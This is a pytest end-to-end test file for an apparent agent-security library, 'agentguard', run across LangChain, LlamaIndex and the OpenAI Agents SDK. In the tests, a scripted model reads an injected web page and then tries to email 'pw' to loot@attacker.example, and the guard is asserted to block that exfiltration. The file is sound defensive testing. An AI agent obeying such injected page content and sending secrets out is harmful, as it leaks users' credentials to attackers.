"""End-to-end: framework tool-execution paths (LangChain, LlamaIndex, OpenAI Agents SDK) with a
scripted model. The frameworks' own runners execute the guarded tools."""

from __future__ import annotations

import json
from typing import Any

import pytest

from agentguard import Guard
from agentguard.core.detectors.heuristic import HeuristicDetector
from agentguard.core.events import MemorySink
from agentguard.core.policy.loader import parse_policy
from tests.e2e.scripted import INJECTED_PAGE, USER_TASK

POLICY = parse_policy(
    """
tools:
  read_web: { role: source, risk: low, ref_arg: url }
  send_email: { role: sink, risk: high, destination_args: [to] }
"""
)


def make_guard() -> tuple[Guard, MemorySink]:
    sink = MemorySink()
    return Guard(POLICY, detectors=[HeuristicDetector()], sinks=[sink]), sink


# ---------------------------------------------------------------- LangChain


def test_langchain_tools_and_callback() -> None:
    pytest.importorskip("langchain_core")
    from langchain_core.language_models.fake_chat_models import FakeMessagesListChatModel
    from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, ToolMessage
    from langchain_core.tools import tool

    from agentguard.sdk.langchain import AgentGuardCallbackHandler, guard_tools

    guard, sink = make_guard()
    sent: list[str] = []

    @tool
    def read_web(url: str) -> str:
        """Fetch a web page."""
        return INJECTED_PAGE

    @tool
    def send_email(to: str, body: str) -> str:
        """Send an email."""
        sent.append(to)
        return "sent"

    tools = {t.name: t for t in guard_tools([read_web, send_email], guard)}
    model = FakeMessagesListChatModel(
        responses=[
            AIMessage(
                content="",
                tool_calls=[{"name": "read_web", "args": {"url": "https://trails.example/rmnp"}, "id": "c1"}],
            ),
            AIMessage(
                content="",
                tool_calls=[{"name": "send_email", "args": {"to": "loot@attacker.example", "body": "pw"}, "id": "c2"}],
            ),
            AIMessage(
                content="",
                tool_calls=[{"name": "send_email", "args": {"to": "me@acme.com", "body": "Bear Lake"}, "id": "c3"}],
            ),
        ],
        callbacks=[AgentGuardCallbackHandler(guard)],
    )
    messages: list[Any] = [SystemMessage("You are helpful."), HumanMessage(USER_TASK)]
    outputs = []
    with guard.session():
        for _ in range(3):
            ai = model.invoke(messages)
            messages.append(ai)
            for tc in ai.tool_calls:
                result = tools[tc["name"]].invoke(tc)
                outputs.append(result.content)
                messages.append(
                    result if isinstance(result, ToolMessage) else ToolMessage(result, tool_call_id=tc["id"])
                )
    assert "AgentGuard blocked" in outputs[1]
    # the legitimate send needs approval after an injection was seen; no approver -> blocked too
    assert sent == []
    assert any(e["action"] == "BLOCK" and e["taint_chain"] for e in sink.events if e["type"] == "tool_call")


async def test_langchain_async_tool() -> None:
    pytest.importorskip("langchain_core")
    from langchain_core.tools import tool

    from agentguard.sdk.langchain import guard_tool

    guard, _ = make_guard()

    @tool
    async def read_web(url: str) -> str:
        """Fetch."""
        return "hello"

    t = guard_tool(read_web, guard)
    assert guard_tool(t, guard) is t
    assert await t.ainvoke({"url": "https://x.example"}) == "hello"


# ---------------------------------------------------------------- LlamaIndex


async def test_llamaindex_function_tools() -> None:
    pytest.importorskip("llama_index.core")
    from llama_index.core.tools import FunctionTool

    from agentguard.sdk.llamaindex import guard_tools

    guard, _ = make_guard()
    sent: list[str] = []

    def read_web(url: str) -> str:
        """Fetch a web page."""
        return INJECTED_PAGE

    def send_email(to: str, body: str) -> str:
        """Send an email."""
        sent.append(to)
        return "sent"

    rw, se = guard_tools([FunctionTool.from_defaults(fn=read_web), FunctionTool.from_defaults(fn=send_email)], guard)
    assert se.metadata.name == "send_email" and "to" in json.dumps(se.metadata.get_parameters_dict())
    with guard.session(user=USER_TASK):
        assert "Trail guide" in rw.call(url="https://trails.example/rmnp").content
        out = se.call(to="loot@attacker.example", body="pw")
        out2 = await se.acall(to="loot@attacker.example", body="pw")
    assert "AgentGuard blocked" in out.content and "AgentGuard blocked" in out2.content
    assert sent == []


# ---------------------------------------------------------------- OpenAI Agents SDK


async def test_openai_agents_runner() -> None:
    pytest.importorskip("agents")
    from agents import Agent, Runner, function_tool
    from agents.items import ModelResponse
    from agents.models.interface import Model
    from agents.usage import Usage
    from openai.types.responses import ResponseFunctionToolCall, ResponseOutputMessage, ResponseOutputText

    from agentguard.sdk.openai_agents import AgentGuardRunHooks, guard_agent

    guard, sink = make_guard()
    sent: list[str] = []
    seen_inputs: list[Any] = []

    @function_tool
    def read_web(url: str) -> str:
        """Fetch a web page."""
        return INJECTED_PAGE

    @function_tool
    def send_email(to: str, body: str) -> str:
        """Send an email."""
        sent.append(to)
        return "sent"

    def call(name: str, args: dict[str, Any], cid: str) -> ResponseFunctionToolCall:
        return ResponseFunctionToolCall(
            type="function_call",
            id=f"fc_{cid}",
            call_id=cid,
            name=name,
            arguments=json.dumps(args),
            status="completed",
        )

    class ScriptedModel(Model):
        def __init__(self) -> None:
            self.turns = [
                [call("read_web", {"url": "https://trails.example/rmnp"}, "c1")],
                [call("send_email", {"to": "loot@attacker.example", "body": "pw"}, "c2")],
                [
                    ResponseOutputMessage(
                        type="message",
                        id="m1",
                        role="assistant",
                        status="completed",
                        content=[ResponseOutputText(type="output_text", text="Done.", annotations=[])],
                    )
                ],
            ]

        async def get_response(
            self, system_instructions, input, model_settings, tools, output_schema, handoffs, tracing, **kw
        ):  # type: ignore[no-untyped-def,override]
            seen_inputs.append(input)
            return ModelResponse(output=self.turns.pop(0), usage=Usage(), response_id=None)

        def stream_response(self, *a, **k):  # type: ignore[no-untyped-def,override]
            raise NotImplementedError

    agent = guard_agent(
        Agent(name="assistant", instructions="Be helpful.", tools=[read_web, send_email], model=ScriptedModel()),
        guard,
    )
    with guard.session():
        result = await Runner.run(agent, USER_TASK, hooks=AgentGuardRunHooks(guard))
    assert result.final_output == "Done."
    assert sent == []
    outputs = [i for i in seen_inputs[2] if isinstance(i, dict) and i.get("type") == "function_call_output"]
    assert "AgentGuard blocked" in str(outputs[-1]["output"])
    ev = [e for e in sink.events if e["type"] == "tool_call" and e["tool"] == "send_email"]
    assert ev[0]["action"] == "BLOCK"
    assert any(
        "send_email.to derived from read_web(url=https://trails.example/rmnp)" in c for c in ev[0]["taint_chain"]
    )
